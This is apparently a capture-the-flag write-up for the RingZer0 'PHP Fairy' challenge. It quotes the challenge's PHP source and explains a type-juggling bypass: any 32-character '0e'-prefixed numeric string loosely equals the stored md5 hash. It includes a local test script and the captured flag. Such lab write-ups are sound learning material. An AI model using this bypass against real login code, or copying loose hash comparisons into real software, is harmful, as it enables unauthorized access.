@@ -1,0 +1,69 @@
+PHP Fairy
+Challenge is located at https://ringzer0team.com/challenges/254
+Code is downloaded from https://ringzer0team.com/challenges/254/?code
+
+Code:
+
+ <?php
+$output = "";
+if (isset($_GET['code'])) {
+  $content = file_get_contents(__FILE__);
+  $content = preg_replace('/FLAG\-[0-9a-zA-Z_?!.,]+/i', 'FLAG-XXXXXXXXXXXXXXXXXXXXXXX', $content);
+  echo '<div class="code-highlight">';
+  highlight_string($content);
+  echo '</div>';
+}
+
+if (isset($_GET['pass'])) {
+  if(!preg_match('/^[^\W_]+$/', $_GET['pass'])) {
+    $output = "Don't hack me please :(";
+  } else {
+
+    $pass = md5("admin1674227342");  // 0e463854177790028825434984462555
+    if ((( ( ( (((($_GET['pass'] == $pass)))) && (((($pass !== $_GET['pass'])))) ) || ( (((($pass == $_GET['pass'])))) && ((($_GET['pass'] !== $pass))) ) ) ))) { // Trolling u lisp masta
+      if (strlen($pass) == strlen($_GET['pass'])) {
+        $output = "<div class='alert alert-success'>FLAG-XXXXXXXXXXXXXXXXXXXXXXX</div>";
+      } else {
+        $output = "<div class='alert alert-danger'>Wrong password</div>";
+      }
+    } else {
+      $output = "<div class='alert alert-danger'>Wrong password</div>";
+    }
+  }
+}
+?>
+
+So, value of $pass needs to be the same, but representation does not 
+(e.g. 5+5 == "10" (the value), but 5+5 !== "10" (how it is represented))
+
+The php code will not allow any other characters besides letters and numbers.
+
+In this case, the value of 0e463854177790028825434984462555 (md5 hash) is "0".  However, we have
+to pass something that represents "0" and has the same number of characters.  In this case, "0e" is
+seen as an exponent ("==" numerical value operator) playing around with this part of the code locally:
+
+<?php
+$pass = md5("admin1674227342");
+$get =   "0e463854177790028825434984462556";  // can really put anything here as long as it starts with a "0" followed by the letter "e" (designates exponent) and then numbers to make a total of 32 characters
+//$get = "0e463854177790028825434984462555";  This doesn't work because ($pass === $_GET['pass']), we don't want that
+echo $pass . "\n";
+echo "strlen pass =" . strlen($pass) . "\n";
+echo $get . "\n";
+echo "strlen get = " . strlen($get) . "\n";
+if ((($get == $pass) && ($pass !== $get)) || (($pass == $get) && ($get !== $pass))){
+    if (strlen($pass) == strlen($get)) {
+        echo "length is the same\n";
+    } else {
+        echo "length is different\n";
+    }
+    echo "true, two values meet conditions\n";
+} else {
+    echo "false, the two values do not meet conditions\n";
+}
+?>
+
+
+As you can see in the notes for the code I was playing with, a 32-character value that starts with "0e"
+and then followed with numbers to make 32 characters (e.g. 0e000000000000003000040000000000)
+
+Flag = FLAG-K7PY48gt02T1yvoO9jzP694FztgR1jIS
